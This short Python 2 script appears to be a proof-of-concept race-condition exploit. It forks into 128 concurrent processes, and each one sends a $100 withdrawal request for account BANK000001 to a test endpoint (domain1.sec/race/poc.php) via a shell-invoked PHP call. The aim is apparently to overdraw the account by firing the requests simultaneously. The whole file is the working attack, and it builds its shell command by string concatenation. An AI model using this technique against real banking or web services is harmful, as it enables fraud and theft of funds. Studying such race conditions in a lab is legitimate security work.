import os
# Withdraw 128 times with 128 concurrent process, $100 each process.
os.fork() #2
os.fork() #4
os.fork() #8
os.fork() #16
os.fork() #32
os.fork() #64
os.fork() #128

url_test = 'http://domain1.sec/race/poc.php?user_code=BANK000001&amount=100'


print os.popen('php -r ' + \
			'"echo file_get_contents(\'' + url_test + '\');"').read()
